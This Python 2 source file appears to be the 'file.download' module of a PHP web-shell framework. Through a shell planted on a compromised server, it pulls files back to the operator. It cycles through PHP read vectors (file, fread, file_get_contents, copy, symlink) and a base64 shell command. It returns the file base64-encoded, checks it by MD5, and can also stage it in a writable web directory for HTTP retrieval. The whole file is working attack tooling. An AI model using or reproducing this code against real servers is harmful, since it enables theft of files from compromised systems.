'''
Created on 24/ago/2011

@author: norby
'''
from core.module import Module, ModuleException
from base64 import b64decode
from hashlib import md5

classname = 'Download'
    
class Download(Module):
    '''Download remote binary/text file using different tecniques
    file.download <remote path> <locale path>
    '''
    
    vectors_order = { 'shell.php' : [  "symlink()", "file()", "fread()", "file_get_contents()", "copy()"], 
                      'shell.sh'  : [ "base64" ]
                     }
    
    vectors = { 'shell.php' : { 
                               "file()"             : "print(base64_encode(implode('', file('%s'))));",
                               "fread()"            : "$f='%s'; print(base64_encode(fread(fopen($f,'rb'),filesize($f))));",
                                "file_get_contents()"     : "print(base64_encode(file_get_contents('%s')));",
                                "copy()"       : "@copy('compress.zlib://%s','%s/file.txt') && file_exists('%s/file.txt') && print(1);",
                                "symlink()"     : "@symlink('%s','%s/file.txt'); file_exists('%s/file.txt') && print(1);"
                                },
                'shell.sh' : {
                                "base64" : "base64 -w 0 %s"
                                }
               }
    
    
    def __init__(self, modhandler, url, password):
        
        self.encoder_callable = False
        self.md5_callable = False
        
        
        self.payload = None
        self.vector = None
        self.interpreter = None
        self.writable_dir = None
        
        
        Module.__init__(self, modhandler, url, password)

        
    def _probe(self):
        
        if self.modhandler.load('shell.php').run("is_callable('base64_encode') && print('1');") == '1':
            self.encoder_callable = True
        else:
            print '[file.download] PHP \'base64_encode()\' transfer methods not available.'
            
        if self.modhandler.load('shell.php').run("is_callable('md5_file') && print('1');") == '1':
            self.md5_callable = 1
        else:
            print '[file.download] PHP \'md5_file()\' file correctness check not available.'
            
            
    def __slack_probe(self, remote_path, local_path):
        

        
        for interpreter in self.vectors:
            for vector in self.vectors_order[interpreter]:
                if interpreter in self.modhandler.loaded_shells:
                    
                    payload = self.vectors[interpreter][vector]
                    
                    if payload.count( '%s' ) == 1:
                        payload = payload % remote_path
                        
                    if (vector.startswith('copy') or vector.startswith('symlink')) and payload.count( '%s' ) == 3:
                        
                        if not self.writable_dir:
                            doc_root = self.modhandler.load('system.info').run('document_root')
                            writable_dir = self.modhandler.load('find.perms').run('first', 'dir', 'w', doc_root)
                            self.writable_dir = writable_dir
                        
                        payload = payload % (remote_path, writable_dir, writable_dir)
                        
                    response = self.modhandler.load(interpreter).run(payload)
                    
                    if response:
                        
                        self.payload = payload
                        self.interpreter = interpreter
                        self.vector = vector
                        
                        return self.__process_response(response, remote_path, local_path )

        raise ModuleException("file.download",  "File download probing failed")       
     
     
    def __process_response(self,response, remote_path, local_path):
        
        
        if self.vector.startswith('copy') or self.vector.startswith('symlink') and response == '1':
            print "[file.read] File copied/linked to '%s/file.txt'. Try to download it via HTTP." % self.writable_dir
        else:
            
            if self.encoder_callable:
                
                response_decoded = b64decode(response)
                
                try:
                    f = open(local_path,'wb')
                    f.write(response_decoded)
                    f.close()
                except Exception, e:
                    print '[!] [file.download] Some error occurred writing local file \'%s\'.' % local_path
                    raise ModuleException('[file.download]', e)
                else:
                    print '[file.download] File downloaded to \'%s\' using method \'%s\'' % (local_path, self.vector)
                
            
    
            if self.md5_callable:
                response_md5 = md5(response_decoded).hexdigest()
                if self.modhandler.load('shell.php').run("print(md5_file('%s'));" % remote_path) == response_md5:
                    print '[file.download] MD5 hash of \'%s\' match.' % local_path
                else:
                    print '[!] [file.download] MD5 hash of \'%s\' file mismatch, file corrupted.' % local_path

        
     
    def run(self, remote_path, local_path):
        
        if not self.payload or not self.interpreter:
            return self.__slack_probe(remote_path, local_path)
        else:
            response = self.modhandler.load(self.interpreter).run(self.payload)
            
            if response:
                return self.__process_response(response,remote_path, local_path)
                
            raise ModuleException("file.download",  "File read failed")
        
        
            
            
        
